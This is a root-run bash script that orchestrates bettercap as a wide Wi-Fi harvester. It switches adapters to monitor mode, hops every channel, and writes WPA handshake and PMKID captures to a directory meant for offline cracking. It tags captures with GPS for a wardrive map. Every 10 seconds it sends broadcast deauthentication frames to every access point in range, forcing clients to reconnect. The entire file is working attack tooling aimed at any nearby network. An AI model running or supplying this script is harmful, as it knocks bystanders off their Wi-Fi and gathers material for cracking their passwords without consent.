#!/bin/bash
#
# Scoutchi orchestrator (Fennec harvester module). Runs as root via fennec-scoutchi.service.
# Scoutchi is a wide Wi-Fi harvester built on bettercap (the same engine Pwnagotchi
# uses), so capture and deauth run together on a single adapter:
#   - channel hopping across every supported frequency (wifi.recon)
#   - 4-way handshake + clientless PMKID capture, written to the handshakes dir
#     Sly already reads (pwnagotchi naming), so cracking needs no change
#   - continuous deauth of every AP (ticker -> wifi.deauth ff:ff:ff:ff:ff:ff),
#     forcing reconnections automatically, no interaction needed
# With two adapters a second bettercap runs on the second card for extra coverage.
#
# Config is read from /tmp/fennec-scoutchi/config.json (written by scoutchi_engine.py):
#   adapters : list of monitor-capable interfaces to use (1 or 2)
#
# Live stats are produced by fennec-scoutchi-poll (reads bettercap's REST API) and
# written to /tmp/fennec-scoutchi/stats.json.
set -u

RUN_DIR=/tmp/fennec-scoutchi
CONFIG="$RUN_DIR/config.json"
STATS="$RUN_DIR/stats.json"
HANDSHAKES=/etc/pwnagotchi/handshakes
CAPLET=/etc/pwnagotchi/pwnagotchi-auto.cap
POLL=/usr/local/bin/fennec-scoutchi-poll

mkdir -p "$RUN_DIR" "$HANDSHAKES"
chmod 755 "$RUN_DIR"
rm -f "$STATS" "$RUN_DIR/run.log"

[ -f "$CONFIG" ] || { echo "no config"; exit 1; }
IFACES=$(python3 -c 'import json,sys;print(" ".join(json.load(open(sys.argv[1])).get("adapters") or []))' "$CONFIG" 2>/dev/null)
[ -n "$IFACES" ] || { echo "no adapters"; exit 1; }
set -- $IFACES
IFACE1="$1"
IFACE2="${2:-}"

pids=()
cleanup() {
    kill "${pids[@]}" 2>/dev/null
    pkill -f "bettercap .*-iface $IFACE1" 2>/dev/null
    [ -n "$IFACE2" ] && pkill -f "bettercap .*-iface $IFACE2" 2>/dev/null
    exit 0
}
trap cleanup TERM INT

monitor_up() {
    local i="$1"
    # Hand the interface over from NetworkManager before switching to monitor.
    nmcli dev set "$i" managed no 2>/dev/null || true
    rfkill unblock wifi 2>/dev/null || true
    ip link set "$i" down 2>/dev/null || true
    iw dev "$i" set type monitor 2>/dev/null || true
    ip link set "$i" up 2>/dev/null || true
    iw dev "$i" info >> "$RUN_DIR/run.log" 2>&1 || true
}

monitor_up "$IFACE1"
[ -n "$IFACE2" ] && monitor_up "$IFACE2"

echo "=== scoutchi start $(date) ifaces=$IFACES ===" >> "$RUN_DIR/run.log"

# Initial stats so the UI shows "running" immediately.
python3 - "$STATS" <<'PY' 2>/dev/null
import json, sys
json.dump({"mode": "wide", "status": "running", "handshakes": 0,
           "pmkid": 0, "aps": 0, "deauth": 0, "recent": []},
          open(sys.argv[1], "w"))
PY
chmod 644 "$STATS" 2>/dev/null

# bettercap eval: capture handshakes + PMKID to Sly's dir, hop all channels, and
# deauth every AP every 10 s.
EVAL="set wifi.handshakes.aggregate false;"
EVAL="$EVAL set wifi.handshakes.file $HANDSHAKES;"
EVAL="$EVAL set wifi.deauth.silent true; set wifi.deauth.open true;"
EVAL="$EVAL wifi.recon on;"
EVAL="$EVAL set ticker.period 10; set ticker.commands \"wifi.deauth ff:ff:ff:ff:ff:ff\"; ticker on"

# GPS: if a GPS receiver is present, enable bettercap's GPS module on card 1 (the
# card carrying the REST API the poller reads). The poller then tags each capture
# with a .gps.json and feeds the wardrive map, so Echo works with Scoutchi alone,
# the way it used to depend on Pwnagotchi. Device and baudrate come from the gps
# section of config.toml, with sane defaults; skipped when no receiver is wired.
GPS_SECTION=$(sed -n '/^\[main.plugins.gps\]/,/^\[/p' /etc/pwnagotchi/config.toml 2>/dev/null)
GPS_DEV=$(printf '%s\n' "$GPS_SECTION" | sed -n 's/^[[:space:]]*device[[:space:]]*=[[:space:]]*"\{0,1\}\([^"]*\)"\{0,1\}.*/\1/p' | head -1)
GPS_SPEED=$(printf '%s\n' "$GPS_SECTION" | sed -n 's/^[[:space:]]*speed[[:space:]]*=[[:space:]]*\([0-9]*\).*/\1/p' | head -1)
[ -n "$GPS_DEV" ] || GPS_DEV=/dev/ttyACM0
[ -n "$GPS_SPEED" ] || GPS_SPEED=9600
EVAL1="$EVAL"
if [ -e "$GPS_DEV" ]; then
    EVAL1="set gps.device $GPS_DEV; set gps.baudrate $GPS_SPEED; gps on; $EVAL"
    echo "gps enabled on $GPS_DEV @ $GPS_SPEED" >> "$RUN_DIR/run.log"
fi

# Card 1 carries the REST API (via the caplet) that the poller reads for stats.
bettercap -no-colors -caplet "$CAPLET" -iface "$IFACE1" -eval "$EVAL1" \
    >> "$RUN_DIR/run.log" 2>&1 &
pids+=($!)

# Card 2 (if present): extra coverage + deauth, no API.
if [ -n "$IFACE2" ]; then
    bettercap -no-colors -iface "$IFACE2" -eval "$EVAL" \
        >> "$RUN_DIR/run.log" 2>&1 &
    pids+=($!)
fi

# Stats poller (bettercap API + handshakes dir -> stats.json).
python3 "$POLL" >> "$RUN_DIR/run.log" 2>&1 &
pids+=($!)

wait
